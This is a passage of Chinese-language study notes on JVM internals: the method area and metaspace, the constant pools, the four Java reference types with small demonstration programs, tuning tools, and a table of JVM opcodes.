e.printStackTrace();\n    }\n  }\n\n  public static void alloc(){\n    User use = new User();\n  }\n\n  static class User{\n  }\n}\n```\n开启了逃逸分析时：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132502.png)\n\n未开启逃逸分析时：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132512.png)\n\n## 本地方法栈\n本地方法就是一个Java调用非Java代码的接口\njava虚拟机栈用于管理Java方法的调用，而本地方法栈用于管理本地方法的调用\n\n## 方法区\n**栈、堆、方法区的交互关系**\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132524.png)\n\n方法区用于存储已被虚拟机加载的类型信息、域信息、方法信息，常量、静态变量、字面量数据、即时编译器编译后的代码缓存等\n即方法区主要用于存放两大数据：字面量和符号引用量。 \n\n字符串常量是放在`字符串常量池`中的\n<font color=\"red\">在jdk7后，把`字符串常量池`和静态变量放入堆上，而不是方法区中</font>\n\n<font color='red'>注：静态变量与常量如果引用类型， 则方法区存储的是引用，而非实体。其引用的对象实体是存储在堆上。但是如果是字面量数据，则存储的是字面量数据 </font>, 例如`String s = \"aa\"`采用字面量方式创建字符串，则字面量\"aa\"存放在字符串常量池上，而不是堆上，但在jdk7后字符串常量池被移动到堆上。\n\n**Hotspot中方法区的演进**\n- 方法区是jvm规范官方规定的一个概念，不同jvm对方法区的逻辑实现可能是不一样的，以Hotspot为例，在jdk7以前，是以`永久代(PermGen)`实现方法区，在jdk8开始，使用元空间来实现方法区\n- 其他jvm可能就不存在永久代的概念，例如BEA JRockit/ IBM J9虚拟机使用的是元空间\n- 当年使用永久代不是一个很好的方法，因为导致java程序更容易OOM(超过-XX:MaxPermSize上限)\n- 元空间的本质和永久代类似，都是对JVM规范中的方法区的实现，不过元空间与永久代最大的区别在于：<font color='red'>元空间不在虚拟机设置的内存中，而是使用本地内存</font>\n- 永久代与元空间的内部结构不同\n\n**设置方法区内存大小**\n在jdk7以前：\n- 通过`-XX:PermSize`来设置永久代初始化分配空间。默认值是20.75M\n- 通过`-XX:MaxPermSize`来设置永久代最大可分配空间。32位机器默认是64M，64位机器默认是82M\n- 当jvm加载的类信息容量超过了这个值，会报`OutOfMemoryError:PermGen space`\n\n在jdk8及以后：\n- 通过`-XX:MetaspaceSize`设置元空间初始化分配空间，在window下，默认值是21M\n- 通过`-XX:MaxMetaspaceSize`设置元空间最大可分配空间，在window上，默认值是-1，及没有限制\n- 与永久代不同，如果不指定大小，默认情况下，虚拟机会耗尽所有的可用系统内存。如果元数据区发生溢出，虚拟机会抛出`OutOfMemoryError:Metaspace`\n- 一旦元空间内存使用量超过初始分配的内存大小，Full Gc将会被触发并卸载没用的类(即这些类对应的类加载器不在存活)，然后会自动重新设置元空间总内存大小，这个值取决于Full GC后释放了多少元空间。如果释放的空间不足，那么在不超过MaxMetaspaceSize时，适当提高该值。如果释放空间过多，则适当降低该值\n- 如果MaxMetaspaceSize设置过低，则MaxMetaspaceSize的值会自动调整的情况会发生很多次。通过垃圾回收器的日志可以观察到Full GC多次调用。为了避免频繁地GC，建议将`-XX:MetaspaceSize`设置为一个相对较高的值\n\n### 运行时常量池与常量池\n运行时常量池是方法区的一部分，Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息是常量池（Class文件常量池），用于存放编译器生成的各种字面量和符号引用，这部分内容将在类加载后存放到方法区的运行时常量池中。运行时常量池相对于Class文件常量池的另一个重要特征是具备动态性，Java语言并不要求常量一定只能在编译期产生，也就是并非预置入Class文件中的常量池的内容才能进入方法区的运行时常量池，运行期间也可能将新的常量放入池中，这种特性被开发人员利用比较多的是String类的intern（）方法。\n <font color=\"red\">`str.intern()`用来判断字符串常量池中是否存在str字符串，如果存在，则返回字符串常量池中str字符串的地址，反之，则在字符串常量池中加载一份str字符串，并返回该地址</font>\n\n当创建类或接口的运行时常量池时，如果构造运行时常量池所需的内存空间超过了方法区所提供的最大值，则jvm会抛OutOfMemoryError异常\n\n## 对象实例化分析\n对内存分配情况分析最常见的示例便是对象实例化:\n```\nObject obj = new Object();\n```\n这段代码的执行会涉及java栈、Java堆、方法区三个最重要的内存区域。假设该语句出现在方法体中，及时对JVM虚拟机不了解的Java使用这，应该也知道obj会作为引用类型（reference）的数据保存在Java栈的本地变量表中，而会在Java堆中保存该引用的实例化对象，但可能并不知道，Java堆中还必须包含能查找到此对象类型数据的地址信息（如对象类型、父类、实现的接口、方法等），这些类型数据则保存在方法区中。\n\n另外，由于reference类型在Java虚拟机规范里面只规定了一个指向对象的引用，并没有定义这个引用应该通过哪种方式去定位，以及访问到Java堆中的对象的具体位置，因此不同虚拟机实现的对象访问方式会有所不同，主流的访问方式有两种：使用句柄池和直接使用指针。\n通过句柄池访问的方式如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132535.png)\n通过直接指针访问的方式如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132546.png)\n这两种对象的访问方式各有优势，使用句柄访问方式的最大好处就是reference中存放的是稳定的句柄地址，在对象呗移动（垃圾收集时移动对象是非常普遍的行为）时只会改变句柄中的实例数据指针，而reference本身不需要修改。使用直接指针访问方式的最大好处是速度快，它节省了一次指针定位的时间开销。目前Java默认使用的Hot Spot虚拟机采用的便是是第二种方式进行对象访问的。\n\n# 强引用、软引用、弱引用、虚引用\nJava中有四种引用类型：强引用、软引用、弱引用、虚引用。\n\n## Java为什么要设计这四种引用\nJava的内存分配和内存回收，都不需要程序员负责，都是由伟大的JVM去负责，一个对象是否可以被回收，主要看是否有引用指向此对象，说的专业点，叫可达性分析。\n\nJava设计这四种引用的主要目的有两个：\n1. 可以让程序员通过代码的方式来决定某个对象的生命周期；\n2. 有利于垃圾回收。\n\n## 强引用\n强引用是最普遍的一种引用，我们写的代码，99.9999%都是强引用：\n```java\nObject o = new Object();\n```\n这种就是强引用了，是不是在代码中随处可见，最亲切。\n只要某个对象有强引用与之关联，这个对象永远不会被回收，即使内存不足，JVM宁愿抛出OOM，也不会去回收。\n\n那么什么时候才可以被回收呢？当强引用和对象之间的关联被中断了，就可以被回收了。\n\n我们可以手动把关联给中断了，方法也特别简单：\n```java\no = null;\n```\n我们可以手动调用GC，看看如果强引用和对象之间的关联被中断了，资源会不会被回收，为了更方便、更清楚的观察到回收的情况，我们需要新写一个类，然后重写finalize方法，下面我们来进行这个实验：\n```java\npublic class Main {\n  public static void main(String[] args) {\n     Stu st = new Stu();\n     st = null;\n     System.gc();\n     System.out.println(\"end....\");\n  }\n}\n\nclass Stu {\n  @Override\n  protected void finalize() throws Throwable {\n    System.out.println(\"Stu被回收了\");\n  }\n}\n```\n运行结果：\n```\nend...\nStudent 被回收了\n```\n可以很清楚的看到资源被回收了。\n\n当然，在实际开发中，千万不要重写finalize方法\n\n在实际的开发中，看到有一些对象被手动赋值为NULL，很大可能就是为了“特意提醒”JVM这块资源可以进行垃圾回收了。\n\n## 软引用\n下面先来看看如何创建一个软引用：\n```java\nSoftReference<Student>studentSoftReference=new SoftReference<Student>(new Student());\n```\n软引用就是把对象用SoftReference包裹一下，当我们需要从软引用对象获得包裹的对象，只要get一下就可以了：\n\n```java\nSoftReference<Student>studentSoftReference=new SoftReference<Student>(new Student());\nStudent student = studentSoftReference.get();\nSystem.out.println(student);\n\n```\n\n### 软引用有什么特点呢\n当内存不足，会触发JVM的GC，如果GC后，内存还是不足，就会把软引用的包裹的对象给干掉，也就是只有在内存不足，JVM才会回收该对象。\n\n还是一样的，必须做实验，才能加深印象：\n```java\nimport java.lang.ref.SoftReference;\n\npublic class Main {\n  public static void main(String[] args) {\n    SoftReference<byte[]> softReference = new SoftReference<byte[]>(new byte[10 * 1024 * 1024]);\n    System.out.println(softReference.get());\n    System.gc();\n    System.out.println(softReference.get());\n\n    byte[] bytes = new byte[10 * 1024 * 1024];\n    System.out.println(softReference.get());\n  }\n}\n```\n我定义了一个软引用对象，里面包裹了byte[]，byte[]占用了10M，然后又创建了10Mbyte[]。\n\n运行程序，需要带上一个参数：`-Xmx15M`, 即如下：\n```shell\njavac Main.java && java -Xmx15M Main\n```\n代表最大堆内存是15M。\n\n运行结果：\n```\n[B@11d7fff\n[B@11d7fff\nnull\n```\n可以很清楚的看到手动完成GC后，软引用对象包裹的byte[]还活的好好的，但是当我们创建了一个10M的byte[]后，最大堆内存不够了，所以把软引用对象包裹的byte[]给干掉了，如果不干掉，就会抛出OOM。\n\n软引用到底有什么用呢？比较适合用作缓存，当内存足够，可以正常的拿到缓存，当内存不够，就会先干掉缓存，不至于马上抛出OOM。\n\n## 弱引用\n弱引用的使用和软引用类似，只是关键字变成了WeakReference：\n```java\nWeakReference<byte[]> weakReference = new WeakReference<byte[]>(new byte[1024*1024*10]);\nSystem.out.println(weakReference.get());\n```\n弱引用的特点是不管内存是否足够，只要发生GC，都会被回收：\n```java\nimport java.lang.ref.*;\n\npublic class Main {\n  public static void main(String[] args) {\n    WeakReference<byte[]> weakReference = new WeakReference<byte[]>(new byte[10 * 1024 * 1024]);\n    System.out.println(weakReference.get());\n    System.gc();\n    System.out.println(weakReference.get());\n  }\n}\n```\n\n运行结果：\n```\n[B@11d7fff\nnull\n```\n可以很清楚的看到明明内存还很充足，但是触发了GC，资源还是被回收了。\n\n弱引用在很多地方都有用到，比如ThreadLocal、WeakHashMap。\n\n\n# jdk自带调优工具java visualvm\n注：这个工具只有在JDK6、JDK7、JDK8版本中才自带，Java VisualVM不再与其他版本JDK捆绑在一起，但您可以从[VisualVM开源项目](https://visualvm.github.io/)站点获取它。\n\n通过命令`jvisualvm`可以调用出调优工具\n```java\npublic class Math{\n\n  byte[] a = new byte[1024 * 100];\n\n  public static void main(String[] args) throws Exception{\n    ArrayList<Math> heapTest = new ArrayList();\n    while(true){\n      heapTest.add(new Math());\n      Thread.sleep(10);\n    }\n  }\n}\n```\n## 虚引用\n虚引用又被称为幻影引用，我们来看看它的使用：\n```java\nReferenceQueue queue = new ReferenceQueue();\nPhantomReference<byte[]> reference = new PhantomReference<byte[]>(new byte[1], queue);\nSystem.out.println(reference.get());\n```\n虚引用的使用和上面说的软引用、弱引用的区别还是挺大的，我们先不管ReferenceQueue 是个什么鬼，直接来运行：\n```\nnull\n```\n竟然打印出了null，我们来看看get方法的源码：\n\n```java\npublic T get() {\n    return null;\n}\n\n```\n这是几个意思，竟然直接返回了null。\n\n这就是虚引用特点之一了：无法通过虚引用来获取对一个对象的真实引用。\n\n那虚引用存在的意义是什么呢？这就要回到我们上面的代码了，我们把代码复制下，以免大家再次往上翻：\n```java\nReferenceQueue queue = new ReferenceQueue();\nPhantomReference<byte[]> reference = new PhantomReference<byte[]>(new byte[1], queue);\nSystem.out.println(reference.get());\n```\n创建虚引用对象，我们除了把包裹的对象传了进去，还传了一个ReferenceQueue，从名字就可以看出它是一个队列。\n\n虚引用的特点之二就是 虚引用必须与ReferenceQueue一起使用，当GC准备回收一个对象，如果发现它还有虚引用，就会在回收之前，把这个虚引用加入到与之关联的ReferenceQueue中。\n\n我们来用代码实践下吧：\n```java\n        ReferenceQueue queue = new ReferenceQueue();\n        List<byte[]> bytes = new ArrayList<>();\n        PhantomReference<Student> reference = new PhantomReference<Student>(new Student(),queue);\n        new Thread(() -> {\n            for (int i = 0; i < 100;i++ ) {\n                bytes.add(new byte[1024 * 1024]);\n            }\n        }).start();\n\n        new Thread(() -> {\n            while (true) {\n                Reference poll = queue.poll();\n                if (poll != null) {\n                    System.out.println(\"虚引用被回收了：\" + poll);\n                }\n            }\n        }).start();\n        Scanner scanner = new Scanner(System.in);\n        scanner.hasNext();\n    }\n```\n运行结果：\n```\nStudent 被回收了\n虚引用被回收了：java.lang.ref.PhantomReference@1ade6f1\n```\n我们简单的分析下代码：\n1. 第一个线程往集合里面塞数据，随着数据越来越多，肯定会发生GC。\n2. 第二个线程死循环，从queue里面拿数据，如果拿出来的数据不是null，就打印出来。\n\n从运行结果可以看到：当发生GC，虚引用就会被回收，并且会把回收的通知放到ReferenceQueue中。\n\n虚引用有什么用呢？在NIO中，就运用了虚引用管理堆外内存。\n\n# jdk自带调优工具java visualvm\n注：这个工具只有在JDK6、JDK7、JDK8版本中才自带，Java VisualVM不再与其他版本JDK捆绑在一起，但您可以从[VisualVM开源项目](https://visualvm.github.io/)站点获取它。\n\n通过命令`jvisualvm`可以调用出调优工具\n```java\npublic class Math{\n\n  byte[] a = new byte[1024 * 100];\n\n  public static void main(String[] args) throws Exception{\n    ArrayList<Math> heapTest = new ArrayList();\n    while(true){\n      heapTest.add(new Math());\n      Thread.sleep(10);\n    }\n  }\n}\n```\njava visualvm界面\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132601.png)\n\n# 调优工具Arthas\n强烈建议使用Arthas\n[Arthas官网](https://arthas.gitee.io/quick-start.html)\n\n# JVM指令助记符\n## 操作数栈\n变量到操作数栈：iload,iload_,lload,lload_,fload,fload_,dload,dload_,aload,aload_\n操作数栈到变量：istore,istore_,lstore,lstore_,fstore,fstore_,dstore,dstor_,astore,astore_\n常数到操作数栈：bipush,sipush,ldc,ldc_w,ldc2_w,aconst_null,iconst_ml,iconst_,lconst_,fconst_,dconst_\n把数据装载到操作数栈：baload,caload,saload,iaload,laload,faload,daload,aaload\n从操作数栈存存储到数组：bastore,castore,sastore,iastore,lastore,fastore,dastore,aastore\n操作数栈管理：pop,pop2,dup,dup2,dup_xl,dup2_xl,dup_x2,dup2_x2,swap\n## 运算与转换\n加：iadd,ladd,fadd,dadd\n减：is ,ls ,fs ,ds \n乘：imul,lmul,fmul,dmul\n除：idiv,ldiv,fdiv,ddiv\n余数：irem,lrem,frem,drem\n取负：ineg,lneg,fneg,dneg\n移位：ishl,lshr,iushr,lshl,lshr,lushr\n按位或：ior,lor\n按位与：iand,land\n按位异或：ixor,lxor\n类型转换：i2l,i2f,i2d,l2f,l2d,f2d(放宽数值转换),i2b,i2c,i2s,l2i,f2i,f2l,d2i,d2l,d2f(缩窄数值转换)\n## 条件转移\n有条件转移：ifeq,iflt,ifle,ifne,ifgt,ifge,ifnull,ifnonnull,if_icmpeq,if_icmpene,if_icmplt,if_icmpgt,if_icmple,if_icmpge,if_acmpeq,if_acmpne,lcmp,fcmpl,fcmpg,dcmpl,dcmpg\n复合条件转移：tableswitch,lookupswitch\n无条件转移：goto,goto_w,jsr,jsr_w,ret\n## 类与数组\n创建类实便：new\n创建新数组：newarray,anewarray,multianwarray\n访问类的域和类实例域：getfield,putfield,getstatic,putstatic\n获取数组长度：arraylength\n检相类实例或数组属性：instanceof,checkcast\n## 调度与返回加finally\n调度对象的实例方法：invokevirtual\n调用由接口实现的方法：invokeinterface\n调用需要特殊处理的实例方法：invokespecial\n调用命名类中的静态方法：invokestatic\n方法返回：ireturn,lreturn,freturn,dreturn,areturn,return\n异常：athrow\nfinally关键字的实现使用：jsr,jsr_w,ret\n\n# JVM指令集\n指令码 助记符    说明  \n0x00 nop      什么都不做  \n0x01 aconst_null 将null推送至操作数栈顶  \n0x02 iconst_m1   将int型-1推送至操作数栈顶  \n0x03 iconst_0   将int型0推送至操作数栈顶  \n0x04 iconst_1   将int型1推送至操作数栈顶  \n0x05 iconst_2   将int型2推送至操作数栈顶  \n0x06 iconst_3   将int型3推送至操作数栈顶  \n0x07 iconst_4   将int型4推送至操作数栈顶  \n0x08 iconst_5   将int型5推送至操作数栈顶  \n0x09 lconst_0   将long型0推送至操作数栈顶  \n0x0a lconst_1   将long型1推送至操作数栈顶  \n0x0b fconst_0   将float型0推送至操作数栈顶  \n0x0c fconst_1   将float型1推送至操作数栈顶  \n0x0d fconst_2   将float型2推送至操作数栈顶  \n0x0e dconst_0   将double型0推送至操作数栈顶  \n0x0f dconst_1   将double型1推送至操作数栈顶  \n0x10 bipush    将单字节的常量值(-128~127)推送至操作数栈顶  \n0x11 sipush    将一个短整型常量值(-32768~32767)推送至操作数栈顶  \n0x12 ldc      将int, float或String型常量值从常量池中推送至操作数栈顶  \n0x13 ldc_w     将int, float或String型常量值从常量池中推送至操作数栈顶（宽索引）  \n0x14 ldc2_w    将long或double型常量值从常量池中推送至操作数栈顶（宽索引）  \n0x15 iload     将指定的int型局部变量推送至操作数栈顶  \n0x16 lload     将指定的long型局部变量推送至操作数栈顶  \n0x17 fload     将指定的float型局部变量推送至操作数栈顶  \n0x18 dload     将指定的double型局部变量推送至操作数栈顶  \n0x19 aload     将指定的引用类型局部变量推送至操作数栈顶  \n0x1a iload_0    将第一个int型局部变量推送至操作数栈顶  \n0x1b iload_1    将第二个int型局部变量推送至操作数栈顶  \n0x1c iload_2    将第三个int型局部变量推送至操作数栈顶  \n0x1d iload_3    将第四个int型局部变量推送至操作数栈顶  \n0x1e lload_0    将第一个long型局部变量推送至操作数栈顶  \n0x1f lload_1    将第二个long型局部变量推送至操作数栈顶  \n0x20 lload_2    将第三个long型局部变量推送至操作数栈顶  \n0x21 lload_3    将第四个long型局部变量推送至操作数栈顶  \n0x22 fload_0    将第一个float型局部变量推送至操作数栈顶  \n0x23 fload_1    将第二个float型局部变量推送至操作数栈顶  \n0x24 fload_2    将第三个float型局部变量推送至操作数栈顶  \n0x25 fload_3    将第四个float型局部变量推送至操作数栈顶  \n0x26 dload_0    将第一个double型局部变量推送至操作数栈顶  \n0x27 dload_1    将第二个double型局部变量推送至操作数栈顶  \n0x28 dload_2    将第三个double型局部变量推送至操作数栈顶  \n0x29 dload_3    将第四个double型局部变量推送至操作数栈顶  \n0x2a aload_0    将第一个引用类型局部变量推送至操作数栈顶  \n0x2b aload_1    将第二个引用类型局部变量推送至操作数栈顶  \n0x2c aload_2    将第三个引用类型局部变量推送至操作数栈顶  \n0x2d aload_3    将第四个引用类型局部变量推送至操作数栈顶  \n0x2e iaload    将int型数组指定索引的值推送至操作数栈顶  \n0x2f laload    将long型数组指定索引的值推送至操作数栈顶  \n0x30 faload    将float型数组指定索引的值推送至操作数栈顶  \n0x31 daload    将double型数组指定索引的值推送至操作数栈顶  \n0x32 aaload    将引用型数组指定索引的值推送至操作数栈顶  \n0x33 baload    将boolean或byte型数组指定索引的值推送至操作数栈顶  \n0x34 caload    将char型数组指定索引的值推送至操作数栈顶  \n0x35 saload    将short型数组指定索引的值推送至操作数栈顶  \n0x36 istore    将操作数栈顶int型数值存入指定局部变量  \n0x37 lstore    将操作数栈顶long型数值存入指定局部变量  \n0x38 fstore    将操作数栈顶float型数值存入指定局部变量  \n0x39 dstore    将操作数栈顶double型数值存入指定局部变量  \n0x3a astore    将操作数栈顶引用型数值存入指定局部变量  \n0x3b istore_0   将操作数栈顶int型数值存入第一个局部变量  \n0x3c istore_1   将操作数栈顶int型数值存入第二个局部变量  \n0x3d istore_2   将操作数栈顶int型数值存入第三个局部变量  \n0x3e istore_3   将操作数栈顶int型数值存入第四个局部变量  \n0x3f lstore_0   将操作数栈顶long型数值存入第一个局部变量  \n0x40 lstore_1   将操作数栈顶long型数值存入第二个局部变量  \n0x41 lstore_2   将操作数栈顶long型数值存入第三个局部变量  \n0x42 lstore_3   将操作数栈顶long型数值存入第四个局部变量  \n0x43 fstore_0   将操作数栈顶float型数值存入第一个局部变量  \n0x44 fstore_1   将操作数栈顶float型数值存入第二个局部变量  \n0x45 fstore_2   将操作数栈顶float型数值存入第三个局部变量  \n0x46 fstore_3   将操作数栈顶float型数值存入第四个局部变量  \n0x47 dstore_0   将操作数栈顶double型数值存入第一个局部变量  \n0x48 dstore_1   将操作数栈顶double型数值存入第二个局部变量  \n0x49 dstore_2   将操作数栈顶double型数值存入第三个局部变量  \n0x4a dstore_3   将操作数栈顶double型数值存入第四个局部变量  \n0x4b astore_0   将操作数栈顶引用型数值存入第一个局部变量  \n0x4c astore_1   将操作数栈顶引用型数值存入第二个局部变量  \n0x4d astore_2   将操作数栈顶引用型数值存入第三个局部变量  \n0x4e astore_3   将操作数栈顶引用型数值存入第四个局部变量  \n0x4f iastore    将操作数栈顶int型数值存入指定数组的指定索引位置  \n0x50 lastore    将操作数栈顶long型数值存入指定数组的指定索引位置  \n0x51 fastore    将操作数栈顶float型数值存入指定数组的指定索引位置  \n0x52 dastore    将操作数栈顶double型数值存入指定数组的指定索引位置  \n0x53 aastore    将操作数栈顶引用型数值存入指定数组的指定索引位置  \n0x54 bastore    将操作数栈顶boolean或byte型数值存入指定数组的指定索引位置  \n0x55 castore    将操作数栈顶char型数值存入指定数组的指定索引位置  \n0x56 sastore    将操作数栈顶short型数值存入指定数组的指定索引位置  \n0x57 pop      将操作数栈顶数值弹出 (数值不能是long或double类型的)  \n0x58 pop2     将操作数栈顶的一个（long或double类型的)或两个数值弹出（其它）  \n0x59 dup      复制操作数栈顶数值并将复制值压入操作数栈顶  \n0x5a dup_x1    复制操作数栈顶数值并将两个复制值压入操作数栈顶  \n0x5b dup_x2    复制操作数栈顶数值并将三个（或两个）复制值压入操作数栈顶  \n0x5c dup2     复制操作数栈顶一个（long或double类型的)或两个（其它）数值并将复制值压入操作数栈顶  \n0x5d dup2_x1    <待补充>  \n0x5e dup2_x2    <待补充>  \n0x5f swap     将栈最顶端的两个数值互换(数值不能是long或double类型的)  \n0x60 iadd     将操作数栈顶两int型数值相加并将结果压入操作数栈顶  \n0x61 ladd     将操作数栈顶两long型数值相加并将结果压入操作数栈顶  \n0x62 fadd     将操作数栈顶两float型数值相加并将结果压入操作数栈顶  \n0x63 dadd     将操作数栈顶两double型数值相加并将结果压入操作数栈顶  \n0x64 isub     将操作数栈顶两int型数值相减并将结果压入操作数栈顶  \n0x65 lsub     将操作数栈顶两long型数值相减并将结果压入操作数栈顶  \n0x66 fsub     将操作数栈顶两float型数值相减并将结果压入操作数栈顶  \n0x67 dsub     将操作数栈顶两double型数值相减并将结果压入操作数栈顶  \n0x68 imul     将操作数栈顶两int型数值相乘并将结果压入操作数栈顶  \n0x69 lmul     将操作数栈顶两long型数值相乘并将结果压入操作数栈顶  \n0x6a fmul     将操作数栈顶两float型数值相乘并将结果压入操作数栈顶  \n0x6b dmul     将操作数栈顶两double型数值相乘并将结果压入操作数栈顶  \n0x6c idiv     将操作数栈顶两int型数值相除并将结果压入操作数栈顶  \n0x6d ldiv     将操作数栈顶两long型数值相除并将结果压入操作数栈顶  \n0x6e fdiv     将操作数栈顶两float型数值相除并将结果压入操作数栈顶  \n0x6f ddiv     将操作数栈顶两double型数值相除并将结果压入操作数栈顶  \n0x70 irem     将操作数栈顶两int型数值作取模运算并将结果压入操作数栈顶  \n0x71 lrem     将操作数栈顶两long型数值作取模运算并将结果压入操作数栈顶  \n0x72 frem     将操作数栈顶两float型数值作取模运算并将结果压入操作数栈顶  \n0x73 drem     将操作数栈顶两double型数值作取模运算并将结果压入操作数栈顶  \n0x74 ineg     将操作数栈顶int型数值取负并将结果压入操作数栈顶  \n0x75 lneg     将操作数栈顶long型数值取负并将结果压入操作数栈顶  \n0x76 fneg     将操作数栈顶float型数值取负并将结果压入操作数栈顶  \n0x77 dneg     将操作数栈顶double型数值取负并将结果压入操作数栈顶  \n0x78 ishl     将int型数值左移位指定位数并将结果压入操作数栈顶  \n0x79 lshl     将long型数值左移位指定位数并将结果压入操作数栈顶  \n0x7a ishr     将int型数值右（符号）移位指定位数并将结果压入操作数栈顶  \n0x7b lshr     将long型数值右（符号）移位指定位数并将结果压入操作数栈顶  \n0x7c iushr     将int型数值右（无符号）移位指定位数并将结果压入操作数栈顶  \n0x7d lushr     将long型数值右（无符号）移位指定位数并将结果压入操作数栈顶  \n0x7e iand     将操作数栈顶两int型数值作“按位与”并将结果压入操作数栈顶  \n0x7f land     将操作数栈顶两long型数值作“按位与”并将结果压入操作数栈顶  \n0x80 ior      将操作数栈顶两int型数值作“按位或”并将结果压入操作数栈顶  \n0x81 lor      将操作数栈顶两long型数值作“按位或”并将结果压入操作数栈顶  \n0x82 ixor     将操作数栈顶两int型数值作“按位异或”并将结果压入操作数栈顶  \n0x83 lxor     将操作数栈顶两long型数值作“按位异或”并将结果压入操作数栈顶  \n0x84 iinc     将指定int型变量增加指定值（i++, i--, i+=2）  \n0x85 i2l      将操作数栈顶int型数值强制转换成long型数值并将结果压入操作数栈顶  \n0x86 i2f      将操作数栈顶int型数值强制转换成float型数值并将结果压入操作数栈顶  \n0x87 i2d      将操作数栈顶int型数值强制转换成double型数值并将结果压入操作数栈顶  \n0x88 l2i      将操作数栈顶long型数值强制转换成int型数值并将结果压入操作数栈顶  \n0x89 l2f      将操作数栈顶long型数值强制转换成float型数值并将结果压入操作数栈顶  \n0x8a l2d      将操作数栈顶long型数值强制转换成double型数值并将结果压入操作数栈顶  \n0x8b f2i      将操作数栈顶float型数值强制转换成int型数值并将结果压入操作数栈顶  \n0x8c f2l      将操作数栈顶float型数值强制转换成long型数值并将结果压入操作数栈顶  \n0x8d f2d      将操作数栈顶float型数值强制转换成double型数值并将结果压入操作数栈顶  \n0x8e d2i      将操作数栈顶double型数值强制转换成int型数值并将结果压入操作数栈顶  \n0x8f d2l      将操作数栈顶double型数值强制转换成long型数值并将结果压入操作数栈顶  \n0x90 d2f      将操作数栈顶double型数值强制转换成float型数值并将结果压入操作数栈顶  \n0x91 i2b      将操作数栈顶int型数值强制转换成byte型数值并将结果压入操作数栈顶  \n0x92 i2c      将操作数栈顶int型数值强制转换成char型数值并将结果压入操作数栈顶  \n0x93 i2s      将操作数栈顶int型数值强制转换成short型数值并将结果压入操作数栈顶  \n0x94 lcmp     比较操作数栈顶两long型数值大小，并将结果（1，0，-1）压入操作数栈顶  \n0x95 fcmpl     比较操作数栈顶两float型数值大小，并将结果（1，0，-1）压入操作数栈顶；当其中一个数值为NaN时，将-1压入操作数栈顶  \n0x96 fcmpg     比较操作数栈顶两float型数值大小，并将结果（1，0，-1）压入操作数栈顶；当其中一个数值为NaN时，将1压入操作数栈顶  \n0x97 dcmpl     比较操作数栈顶两double型数值大小，并将结果（1，0，-1）压入操作数栈顶；当其中一个数值为NaN时，将-1压入操作数栈顶  \n0x98 dcmpg     比较操作数栈顶两double型数值大小，并将结果（1，0，-1）压入操作数栈顶；当其中一个数值为NaN时，将1压入操作数栈顶  \n0x99 ifeq     当操作数栈顶int型数值等于0时跳转  \n0x9a ifne     当操作数栈顶int型数值不等于0时跳转  \n0x9b iflt     当操作数栈顶int型数值小于0时跳转  \n0x9c ifge     当操作数栈顶int型数值大于等于0时跳转  \n0x9d ifgt     当操作数栈顶int型数值大于0时跳转  \n0x9e ifle     当操作数栈顶int型数值小于等于0时跳转  \n0x9f if_icmpeq   比较操作数栈顶两int型数值大小，当结果等于0时跳转  \n0xa0 if_icmpne   比较操作数栈顶两int型数值大小，当结果不等于0时跳转  \n0xa1 if_icmplt   比较操作数栈顶两int型数值大小，当结果小于0时跳转  \n0xa2 if_icmpge   比较操作数栈顶两int型数值大小，当结果大于等于0时跳转  \n0xa3 if_icmpgt   比较操作数栈顶两int型数值大小，当结果大于0时跳转  \n0xa4 if_icmple   比较操作数栈顶两int型数值大小，当结果小于等于0时跳转  \n0xa5 if_acmpeq   比较操作数栈顶两引用型数值，当结果相等时跳转  \n0xa6 if_acmpne   比较操作数栈顶两引用型数值，当结果不相等时跳转  \n0xa7 goto     无条件跳转  \n0xa8 jsr      跳转至指定16位offset位置，并将jsr下一条指令地址压入操作数栈顶  \n0xa9 ret      返回至局部变量指定的index的指令位置（一般与jsr, jsr_w联合使用）  \n0xaa tableswitch    用于switch条件跳转，case值连续（可变长度指令）  \n0xab lookupswitch   用于switch条件跳转，case值不连续（可变长度指令）  \n0xac ireturn    从当前方法返回int \n0xad lreturn    从当前方法返回long \n0xae freturn    从当前方法返回float \n0xaf dreturn    从当前方法返回double \n0xb0 areturn    从当前方法返回对象引用  \n0xb1 return    从当前方法返回void \n0xb2 getstatic   获取指定类的静态域，并将其值压入操作数栈顶  \n0xb3 putstatic   为指定的类的静态域赋值  \n0xb4 getfield   获取指定类的实例域，并将其值压入操作数栈顶  \n0xb5 putfield   为指定的类的实例域赋值  \n0xb6 invokevirtual   调用实例方法  \n0xb7 invokespecial   调用超类构造方法，实例初始化方法，私有方法  \n0xb8 invokestatic   调用静态方法  \n0xb9 invokeinterface 调用接口方法  \n0xba --  \n0xbb new      创建一个对象，并将其引用值压入操作数栈顶  \n0xbc newarray   创建一个指定原始类型（如int, float, char…）的数组，并将其引用值压入操作数栈顶  \n0xbd anewarray   创建一个引用型（如类，接口，数组）的数组，并将其引用值压入操作数栈顶  \n0xbe arraylength 获得数组的长度值并压入操作数栈顶  \n0xbf athrow    将操作数栈顶的异常抛出  \n0xc0 checkcast   检验类型转换，检验未通过将抛出ClassCastException  \n0xc1 instanceof 检验对象是否是指定的类的实例，如果是将1压入操作数栈顶，否则将0压入操作数栈顶  \n0xc2 monitorenter   获得对象的锁，用于同步方法或同步块  \n0xc3 monitorexit    释放对象的锁，用于同步方法或同步块  \n0xc4 wide     <待补充>  \n0xc5 multianewarray 创建指定类型和指定维度的多维数组（执行该指令时，操作栈中必须包含各维度的长度值），并将其引用值压入操作数栈顶  \n0xc6 ifnull    为null时跳转  \n0xc7 ifnonnull   不为null时跳转  \n0xc8 goto_w    无条件跳转（宽索引）  \n0xc9 jsr_w     跳转至指定32位offset位置，并将jsr_w下一条指令地址压入操作数栈顶 \n"
  },
  {
    "title": "./notes/基础知识/线性代数.md",
